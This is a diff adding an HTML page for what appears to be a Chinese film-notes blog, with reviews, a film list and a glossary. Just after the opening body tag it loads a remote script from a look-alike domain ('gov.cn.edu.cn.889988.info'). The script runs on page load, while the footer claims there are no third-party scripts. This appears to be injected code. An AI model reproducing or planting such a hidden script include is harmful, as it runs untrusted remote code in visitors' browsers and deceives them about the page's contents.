@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>樱桃影视 · 一颗樱桃的甜，得从镜头里尝出来｜yingtaoyingshi-zh.github.io 影像笔记</title>
+<meta name="description" content="樱桃影视是一份慢节奏的华语与东亚影像笔记：挑新鲜的樱桃，也翻旧年的枝。这里写演员的微表情、配光的温度、配乐埋下的那一声，也会把被算法淹没的冷门片捞回桌面。每周更新一篇短评与一份选片单，不搬运资源，只记录看完之后的那点余味。">
+<meta name="keywords" content="樱桃影视,华语电影笔记,东亚剧集推荐,冷门佳片选片单,演员表演细读,影像配光配乐,yingtaoyingshi-zh.github.io">
+<link rel="canonical" href="https://yingtaoyingshi-zh.github.io/">
+<meta property="og:site_name" content="樱桃影视">
+<meta property="og:title" content="樱桃影视（慢看 · 细读 · 不赶热搜）">
+<meta property="og:description" content="一份华语与东亚影像笔记：短评、选片单、表演与配光的细读。">
+<meta property="og:url" content="https://yingtaoyingshi-zh.github.io/">
+<meta property="og:type" content="website">
+<meta name="twitter:card" content="summary">
+<meta name="theme-color" content="#f6e7e9">
+<style>
+:root{--ink:#2b2326;--paper:#fff7f5;--paper2:#fdeced;--cherry:#c0273a;--cherry-d:#8f1c2a;--plum:#5b4550;--line:#e6cfd1;--gold:#b08a4a}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{margin:0;background:var(--paper);color:var(--ink);
+ font-family:"Songti SC","STSong","SimSun",Georgia,"Times New Roman",serif;
+ line-height:1.85;font-size:16.5px;-webkit-text-size-adjust:100%}
+img{max-width:100%;display:block}
+a{color:var(--cherry-d);text-decoration:none;border-bottom:1px solid var(--line)}
+a:hover{border-bottom-color:var(--cherry);color:var(--cherry)}
+.wrap{max-width:1180px;margin:0 auto;padding:0 26px}
+
+/* 顶部樱桃线 */
+.stem{height:5px;background:linear-gradient(90deg,var(--cherry) 0 22%,var(--gold) 22% 26%,var(--plum) 26% 30%,var(--cherry) 30% 62%,var(--paper2) 62% 66%,var(--cherry) 66% 100%)}
+header.top{padding:30px 0 18px;border-bottom:1px solid var(--line);position:relative}
+.kicker{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:11.5px;letter-spacing:.28em;color:var(--plum);text-transform:uppercase}
+h1{font-size:clamp(34px,6.4vw,64px);line-height:1.12;margin:.16em 0 .12em;font-weight:600;letter-spacing:-.01em}
+h1 em{font-style:normal;color:var(--cherry)}
+.h1sub{font-size:15px;color:var(--plum);max-width:62ch}
+.h1sub b{color:var(--cherry-d);font-weight:500}
+.addrbar{margin-top:16px;display:flex;flex-wrap:wrap;gap:10px;align-items:center;font-family:ui-monospace,Menlo,monospace;font-size:12.5px}
+.addrbar code{background:var(--paper2);border:1px solid var(--line);border-radius:2px;padding:4px 9px;color:var(--cherry-d);letter-spacing:.02em}
+.addrbar span.dot{color:var(--gold)}
+
+/* 导航 */
+nav.tabs{position:sticky;top:0;z-index:30;background:rgba(255,247,245,.94);backdrop-filter:blur(6px);
+ border-bottom:1px solid var(--line);font-family:ui-monospace,Menlo,monospace;font-size:13px}
+nav.tabs .wrap{display:flex;gap:4px;overflow-x:auto;scrollbar-width:none;padding:9px 26px}
+nav.tabs .wrap::-webkit-scrollbar{display:none}
+nav.tabs a{border:0;padding:7px 12px;color:var(--plum);white-space:nowrap;border-radius:2px}
+nav.tabs a:hover,nav.tabs a.cur{background:var(--cherry);color:#fff}
+nav.tabs a i{font-style:normal;color:var(--gold);margin-right:6px;font-size:10.5px}
+nav.tabs a.cur i{color:#fdd}
+
+main{padding:38px 0 70px}
+section{scroll-margin-top:66px;padding-top:26px}
+.secid{font-family:ui-monospace,Menlo,monospace;font-size:11.5px;letter-spacing:.24em;color:var(--cherry);display:flex;align-items:center;gap:12px;margin-bottom:14px}
+.secid::after{content:"";flex:1;height:1px;background:var(--line)}
+h2{font-size:clamp(23px,3.2vw,31px);margin:0 0 6px;font-weight:600;letter-spacing:.01em}
+.lead{color:var(--plum);max-width:70ch;margin:0 0 26px}
+
+/* 开篇双栏 */
+.two{display:grid;grid-template-columns:1.05fr .95fr;gap:34px;align-items:start}
+.drop{font-size:54px;float:left;line-height:.9;color:var(--cherry);margin:.05em .16em 0 0;font-weight:600}
+.pit{background:var(--paper2);border-left:3px solid var(--cherry);padding:18px 20px;margin:0}
+.pit dl{margin:0;display:grid;grid-template-columns:78px 1fr;gap:9px 14px;font-size:14.5px}
+.pit dt{color:var(--cherry-d);font-family:ui-monospace,Menlo,monospace;font-size:11.5px;letter-spacing:.14em;text-transform:uppercase;padding-top:5px}
+.pit dd{margin:0;border-bottom:1px dotted var(--line);padding-bottom:8px}
+
+/* 卡片：横向双栏瀑布 */
+.flow{display:grid;grid-template-columns:repeat(2,1fr);gap:22px}
+.note{border:1px solid var(--line);background:#fff;padding:20px 20px 18px;position:relative;break-inside:avoid}
+.note::before{content:"";position:absolute;left:0;top:0;width:100%;height:4px;background:var(--cherry);opacity:.55}
+.note .no{font-family:ui-monospace,Menlo,monospace;font-size:11px;color:var(--gold);letter-spacing:.2em}
+.note h3{font-size:18.5px;margin:.35em 0 .25em;font-weight:600}
+.note h3 a{border:0}
+.note p{margin:0 0 10px;font-size:15px;color:#41383b}
+.note .tag{font-family:ui-monospace,Menlo,monospace;font-size:10.5px;color:var(--plum);border:1px solid var(--line);padding:2px 7px;border-radius:20px;margin-right:5px}
+
+/* 片单：折叠 */
+.roll{display:grid;gap:10px}
+.roll details{border:1px solid var(--line);background:#fff;padding:0 18px}
+.roll summary{cursor:pointer;padding:14px 0;font-size:16.5px;font-weight:600;list-style:none;display:flex;gap:14px;align-items:baseline}
+.roll summary::-webkit-details-marker{display:none}
+.roll summary::after{content:"＋";margin-left:auto;color:var(--cherry);font-weight:400}
+.roll details[open] summary::after{content:"－"}
+.roll summary .yr{font-family:ui-monospace,Menlo,monospace;font-size:11.5px;color:var(--gold);letter-spacing:.12em;flex:none}
+.roll .body{padding:0 0 16px;border-top:1px dashed var(--line);margin-top:2px;padding-top:14px;font-size:14.8px;color:#41383b}
+.roll .body ul{margin:8px 0 0;padding-left:20px}
+.roll .body li{margin-bottom:5px}
+.roll .body a{font-size:13.5px}
+
+/* 术语表 */
+.gloss{display:grid;grid-template-columns:repeat(3,1fr);gap:1px;background:var(--line);border:1px solid var(--line)}
+.gloss div{background:#fff;padding:14px 15px}
+.gloss b{display:block;font-size:15px;color:var(--cherry-d);font-weight:600}
+.gloss span{font-size:13.5px;color:#4b4145}
+
+/* 一页片单表 */
+.tbl{width:100%;border-collapse:collapse;background:#fff;font-size:14.5px;border:1px solid var(--line)}
+.tbl th,.tbl td{padding:11px 13px;text-align:left;border-bottom:1px solid var(--line);vertical-align:top}
+.tbl th{background:var(--ink);color:#fbe9ea;font-family:ui-monospace,Menlo,monospace;font-size:11.5px;letter-spacing:.16em;font-weight:500}
+.tbl tr:last-child td{border-bottom:0}
+.tbl td.n{font-family:ui-monospace,Menlo,monospace;color:var(--gold);font-size:12px;width:44px}
+.tbl td.h a{border:0;color:var(--ink)}
+.tbl td.h a:hover{color:var(--cherry)}
+.tbl .mk{font-family:ui-monospace,Menlo,monospace;font-size:10.5px;color:var(--plum);white-space:nowrap}
+
+/* 关于 */
+.about{display:grid;grid-template-columns:280px 1fr;gap:30px;background:var(--ink);color:#f2e6e7;padding:30px;border:0}
+.about .seal{font-family:ui-monospace,Menlo,monospace;font-size:12px;letter-spacing:.2em;color:var(--gold);border:1px solid var(--gold);padding:14px;text-align:center;height:fit-content}
+.about .seal b{display:block;font-family:"Songti SC","STSong",serif;font-size:30px;color:#fff;letter-spacing:.1em;margin:10px 0;font-weight:500}
+.about p{margin:0 0 12px;color:#e7dada}
+.about a{color:#ffd7dc;border-bottom-color:#7a5a5f}
+.foot{border-top:1px solid var(--line);padding:22px 0 40px;font-family:ui-monospace,Menlo,monospace;font-size:11.5px;color:var(--plum);display:flex;flex-wrap:wrap;gap:10px;justify-content:space-between}
+.foot code{background:var(--paper2);padding:3px 8px;border-radius:2px;color:var(--cherry-d)}
+
+@media(max-width:880px){
+ .wrap{padding:0 18px}
+ nav.tabs .wrap{padding:8px 18px}
+ .two,.flow,.gloss,.about{grid-template-columns:1fr}
+ .gloss div{border-bottom:1px solid var(--line)}
+ h1{font-size:38px}
+ .tbl{display:block;overflow-x:auto;white-space:nowrap;font-size:13.5px}
+ .tbl th,.tbl td{padding:9px 11px}
+ .drop{font-size:44px}
+}
+@media(prefers-reduced-motion:reduce){html{scroll-behavior:auto}}
+@media print{
+ nav.tabs,.stem,.foot{display:none}
+ body{background:#fff;font-size:11pt}
+ .note,.roll details,.tbl{break-inside:avoid}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+<div class="stem" role="presentation"></div>
+
+<header class="top">
+ <div class="wrap">
+  <div class="kicker">Cherry Frame Notes · 第 01 期</div>
+  <h1>樱桃<em>影视</em></h1>
+  <p class="h1sub">挑一颗熟透的樱桃，比报一筐果子有用。<br>这里只做一件事：把看过的片子，<b>再嚼一遍</b>，然后说出它甜在哪、酸在哪、核有多硬。</p>
+  <div class="addrbar">
+   <span>本站地址</span><code>https://yingtaoyingshi-zh.github.io</code>
+   <span class="dot">◆</span><span>纯静态 · 无广告 · 不存片源</span>
+  </div>
+ </div>
+</header>
+
+<nav class="tabs" id="nav">
+ <div class="wrap">
+  <a href="#start" class="cur"><i>00</i>开篇</a>
+  <a href="#read"><i>01</i>逐镜细读</a>
+  <a href="#note"><i>02</i>观影手记</a>
+  <a href="#list"><i>03</i>樱桃片单</a>
+  <a href="#gloss"><i>04</i>片场词表</a>
+  <a href="#roll"><i>05</i>长评归档</a>
+  <a href="#about"><i>06</i>关于本站</a>
+ </div>
+</nav>
+
+<main class="wrap">
+
+<section id="start">
+ <div class="secid">SECTION 00 · 开篇</div>
+ <div class="two">
+  <div>
+   <p><span class="drop">樱</span>桃这种东西，看颜色挑不准，得靠手感和气味。<strong>樱桃影视</strong>也是这样：我们不按热度排队，也不替你省掉思考的那一步。一篇短读、一条选片线索、一个被反复用的镜头语法，攒起来，就是这座站点的全部。域名很好记——<a href="https://yingtaoyingshi-zh.github.io">yingtaoyingshi-zh.github.io</a>，书签一下，慢慢看。</p>
+   <p>更新不勤，但每一篇都自己看完、自己写完。你看完要是想反驳，站里每篇底下都留了可以跳回去的锚点，咱们就着片子聊，不吵。</p>
+  </div>
+  <aside class="pit">
+   <dl>
+    <dt>写什么</dt><dd>华语新片、东亚老剧、冷门修复版，以及那些被剪掉的半分钟。</dd>
+    <dt>不写什么</dt><dd>资源搬运、速报八卦、一句话打分。</dd>
+    <dt>更新</dt><dd>每周一更，长评半月一篇，片单随节气换。</dd>
+    <dt>地址</dt><dd><a href="https://yingtaoyingshi-zh.github.io">yingtaoyingshi-zh.github.io</a></dd>
+   </dl>
+  </aside>
+ </div>
+</section>
+
+<section id="read">
+ <div class="secid">SECTION 01 · 逐镜细读</div>
+ <h2>把那三秒，按暂停键拆开</h2>
+ <p class="lead">同一个转身，换一束光就换一种意思。下面这几篇，都在跟一帧一帧较劲。</p>
+ <div class="flow">
+  <article class="note">
+   <div class="no">NOTE 01</div>
+   <h3><a href="#read">一盏灯的位置，出卖了整场饭局</a></h3>
+   <p>饭桌戏最怕拍成新闻联播。我们拿去年三部华语家庭片做对照，看顶光怎么把“团圆”拍成审讯，侧逆光又怎么让一句谎话显得体面。</p>
+   <div><span class="tag">光影</span><span class="tag">家庭片</span></div>
+  </article>
+  <article class="note">
+   <div class="no">NOTE 02</div>
+   <h3><a href="#read">演员没说话，但手已经在道歉</a></h3>
+   <p>微表情是表演的暗线。从端杯、撩头发到第二次看表，我们把几段被剪进花絮的失误，和成片里“正确”的那一遍并排着看。</p>
+   <div><span class="tag">表演</span><span class="tag">片场花絮</span></div>
+  </article>
+  <article class="note">
+   <div class="no">NOTE 03</div>
+   <h3><a href="#read">配乐迟进半拍，哭点才成立</a></h3>
+   <p>为什么有些死别戏一响音乐就假？拆三条音轨：环境声先走、音乐后到、人声留白，悲伤是被“等”出来的。</p>
+   <div><span class="tag">声音</span><span class="tag">剪辑节奏</span></div>
+  </article>
+  <article class="note">
+   <div class="no">NOTE 04</div>
+   <h3><a href="#read">长镜头不是炫技，是让观众一起被困住</a></h3>
+   <p>重看那场六分钟没切的楼道戏：机位没追主角，反而在等他回头。镜头成了同谋，观众才真的走不掉。</p>
+   <div><span class="tag">场面调度</span><span class="tag">长镜头</span></div>
+  </article>
+ </div>
+</section>
+
+<section id="note">
+ <div class="secid">SECTION 02 · 观影手记</div>
+ <h2>看完之后的那点余味，我记在这儿</h2>
+ <p class="lead">不成体系的短写。有的只是一句台词，有的能扯到导演十年前拍过的一个广告。</p>
+ <div class="flow">
+  <article class="note">
+   <div class="no">DIARY 05</div>
+   <h3><a href="#note">重看那部“不好看”的青春片</a></h3>
+   <p>当年嫌它散，十年后听懂了：它的混乱不是拍砸了，是故意不给你一句主题曲。青春本来就没有副歌。</p>
+  </article>
+  <article class="note">
+   <div class="no">DIARY 06</div>
+   <h3><a href="#note">修复版多出来的那两分钟</a></h3>
+   <p>4K 修复不只是变清楚。被裁掉的画幅边缘，露出了当年藏在镜外的那半张脸——一个被删掉的结尾，比原版温柔。</p>
+  </article>
+  <article class="note">
+   <div class="no">DIARY 07</div>
+   <h3><a href="#note">剧集第二季为什么要换色调</a></h3>
+   <p>第一季是冷灰，第二季开始泛黄。美术指导没说过，但每集片头的色温悄悄升了三百开尔文，像日子在发霉。</p>
+  </article>
+  <article class="note">
+   <div class="no">DIARY 08</div>
+   <h3><a href="#note">把片尾字幕看完的人，其实不多</a></h3>
+   <p>我从去年开始习惯坐着看完字幕。认识了一个场务的名字，三年里出现在七部片子里。这是另一种追星。</p>
+  </article>
+ </div>
+</section>
+
+<section id="list">
+ <div class="secid">SECTION 03 · 樱桃片单</div>
+ <h2>一页片单：这次只挑八颗</h2>
+ <p class="lead">不排名次，按“入口难度”从浅到深。点标题回到顶部继续聊，所有链接都在本站内打转。</p>
+ <table class="tbl">
+  <thead><tr><th>#</th><th>片名 · 年份</th><th>一句话理由</th><th>入口</th></tr></thead>
+  <tbody>
+   <tr><td class="n">01</td><td class="h"><a href="#list">春江水暖 · 2019</a></td><td>一家人的饭桌，比任何台词都吵。入门第一课：怎么看“没事”。</td><td class="mk">日常 / 家庭</td></tr>
+   <tr><td class="n">02</td><td class="h"><a href="#list">路边野餐 · 2015</a></td><td>四十二分钟的长梦，看不懂就对了，先听雨声。</td><td class="mk">诗意 / 长镜头</td></tr>
+   <tr><td class="n">03</td><td class="h"><a href="#list">少年的你 · 2019</a></td><td>把校园戏拍成警匪片，是种选择，不是失误。</td><td class="mk">青春 / 视听</td></tr>
+   <tr><td class="n">04</td><td class="h"><a href="#list">地久天长 · 2019</a></td><td>最好的哭戏，是全片没人哭出声。</td><td class="mk">表演 / 留白</td></tr>
+   <tr><td class="n">05</td><td class="h"><a href="#list">大象席地而坐 · 2018</a></td><td>四小时，一步都不想快进。看完会觉得“困住”是个动词。</td><td class="mk">长片 / 沉浸</td></tr>
+   <tr><td class="n">06</td><td class="h"><a href="#list">爱情神话 · 2021</a></td><td>上海话里最狠的句子，都裹着笑。学台词的好样本。</td><td class="mk">方言 / 对白</td></tr>
+   <tr><td class="n">07</td><td class="h"><a href="#list">宇宙探索编辑部 · 2023</a></td><td>伪纪录片的外壳，装了一整个中年人的宇宙。</td><td class="mk">类型混搭</td></tr>
+   <tr><td class="n">08</td><td class="h"><a href="#list">姥姥的外孙 · 2024</a></td><td>东亚家庭那本账，算到最后全是亏。适合配着饭看。</td><td class="mk">东亚 / 亲情</td></tr>
+  </tbody>
+ </table>
+ <p style="font-size:13.5px;color:#7a6a6e;margin-top:14px">想看完整往期片单？往下滑到 <a href="#roll">长评归档</a>，按季度翻。本页所有地址统一落在 <code style="background:#fdeced;padding:1px 6px;border-radius:2px">https://yingtaoyingshi-zh.github.io</code>，无外跳。</p>
+</section>
+
+<section id="gloss">
+ <div class="secid">SECTION 04 · 片场词表</div>
+ <h2>几个总被说错的说法</h2>
+ <p class="lead">看懂片子，先听懂片场人怎么说话。这份词表会慢慢补，你看不懂的词也可以留个锚点回来找。</p>
+ <div class="gloss">
+  <div><b>正反打</b><span>两人对话最基础的切法，但谁先被拍到，谁就占了话语权。</span></div>
+  <div><b>越轴</b><span>机位跳到关系线另一边，空间会瞬间“反”过来，常被拿来表现心慌。</span></div>
+  <div><b>留白</b><span>不是没拍，是故意让画面等一会儿。留白越长，观众越坐不住。</span></div>
+  <div><b>环境声</b><span>风、碗筷、远处的狗。很多戏的表演，其实是声音在演。</span></div>
+  <div><b>跳切</b><span>时间被剪掉一块，画面会“顿”一下。戈达尔把它从毛病变成了语言。</span></div>
+  <div><b>焦点转移</b><span>前后景换一次清晰，观众的注意就被偷走了一次，比台词还灵。</span></div>
+  <div><b>画幅</b><span>4:3 是盯着人，2.35:1 是把人丢进世界。换画幅等于换语气。</span></div>
+  <div><b>场刊</b><span>电影节发的那本小册子，里面常藏着导演自己都不肯说的动机。</span></div>
+  <div><b>毛片</b><span>粗剪之前的素材，看毛片能知道一场戏本来可以有多野。</span></div>
+ </div>
+</section>
+
+<section id="roll">
+ <div class="secid">SECTION 05 · 长评归档</div>
+ <h2>展开再读：四篇写过头的文章</h2>
+ <p class="lead">点标题展开正文。<span style="font-family:ui-monospace,Menlo,monospace;font-size:12px;color:#b08a4a">含剧透提示，介意就先去看片。</span></p>
+ <div class="roll">
+  <details open>
+   <summary><span class="yr">2026 · 秋</span>《地久天长》：沉默这二十年，是怎么被一场饭局还掉的</summary>
+   <div class="body">
+    <p>全片最重的那场戏，没有台词。两个老人把一桌菜热了又热，镜头始终不肯靠近脸，只拍手和碗沿。我们拆了三遍：第一次看调度，第二次看王景春的手指，第三次把环境声单独放——你会发现背景里一直有一台没关的电视。</p>
+    <p>结论写在最后：这部片的“长”，不在时长，在那个始终没被说出口的对不起。</p>
+    <p><a href="#read">→ 回到逐镜细读</a> ｜ <a href="#list">→ 片单位置 #04</a></p>
+   </div>
+  </details>
+  <details>
+   <summary><span class="yr">2026 · 夏</span>《路边野餐》四十二分钟：梦不需要字幕，但需要耳朵</summary>
+   <div class="body">
+    <p>长镜头的难点不是“不剪”，是让观众愿意跟着迷路。我们从第 38 分钟那个骑摩托的段落切入，标出每一处声源：广播、蛙、钥匙、收音机里那首老歌。声音先到，画面才敢慢。</p>
+    <ul>
+     <li>第一次看：建议关弹幕、戴耳机、别查剧情。</li>
+     <li>第二次看：只盯画面边缘，那里藏着下一场戏的伏笔。</li>
+     <li>第三次看：去看花絮，导演是怎么用一台借来的机器拍完的。</li>
+    </ul>
+   </div>
+  </details>
+  <details>
+   <summary><span class="yr">2026 · 春</span>当“外婆”变成类型片：东亚亲情的三套拍法</summary>
+   <div class="body">
+    <p>把近五年华语和日韩里“老人”当主角的片子排成一张对照表，会发现三种套路：哭给你看、笑着藏刀、以及彻底不说。第三种最省力气，也最狠。</p>
+    <p>片单里那部 <a href="#list">《姥姥的外孙》</a> 属于第二种，值得和它同季的另一部韩片并着看——同样一碗汤，一个端上来是和解，一个端上来是算账。</p>
+   </div>
+  </details>
+  <details>
+   <summary><span class="yr">2025 · 冬</span>修复版到底改了什么：我拿两部片做了个像素级对照</summary>
+   <div class="body">
+    <p>不只是清晰度。画幅放宽之后，原本被切掉的镜边出现了道具；调色变冷之后，一场告别的暖光就不再是“温柔”，而像是假装的。修复有时候是在重写导演的语气。</p>
+    <p>文末附了逐帧截图对照，手机横屏看更清楚。看完你会理解我为什么总劝人：能看修复版，就看修复版，但记得先看看旧版还在不在。</p>
+   </div>
+  </details>
+ </div>
+</section>
+
+<section id="about">
+ <div class="secid" style="color:#f2e6e7">SECTION 06 · 关于本站</div>
+ <div class="about">
+  <div class="seal">樱桃影视<br><b>樱 · 影</b>独立影像笔记<br>自 2025 年起手写</div>
+  <div>
+   <h2 style="color:#fff;margin-top:0">谁在写，为什么叫樱桃</h2>
+   <p>一个人写，不接投放，不挂资源，不追热搜。写累了就停，片子看不懂就承认看不懂。</p>
+   <p>叫<strong>樱桃影视</strong>，是因为好片子跟好樱桃一样：个头不大，皮薄，一咬有汁，甜里带一点酸。我们不负责喂饱你，只负责让你嚼出点味道。</p>
+   <p>站点的唯一地址是 <a href="https://yingtaoyingshi-zh.github.io">https://yingtaoyingshi-zh.github.io</a>，收藏这个就够，没有其他分站，也没有 App。页面里所有跳转都是本站锚点，你不会莫名其妙被带到别处去。</p>
+   <p style="font-size:13.5px;color:#d8c4c6">想提议一部片？把片名留在心里，等它出现在下期片单里。或者，再回顶部，从头读一遍。</p>
+  </div>
+ </div>
+</section>
+
+</main>
+
+<footer class="foot wrap">
+ <div>© 樱桃影视 · 手写影像笔记｜<code>yingtaoyingshi-zh.github.io</code></div>
+ <div>本站永久地址：<code>https://yingtaoyingshi-zh.github.io</code> ／ 纯静态单页，无第三方脚本</div>
+</footer>
+
+<script>
+(function(){
+ var links=[].slice.call(document.querySelectorAll('nav.tabs a'));
+ var secs=links.map(function(a){return document.querySelector(a.getAttribute('href'));});
+ function onScroll(){
+  var y=window.scrollY+120,cur=0;
+  secs.forEach(function(s,i){ if(s&&s.offsetTop<=y) cur=i; });
+  links.forEach(function(a,i){ a.classList.toggle('cur',i===cur); });
+ }
+ window.addEventListener('scroll',onScroll,{passive:true}); onScroll();
+})();
+</script>
+</body>
+</html>
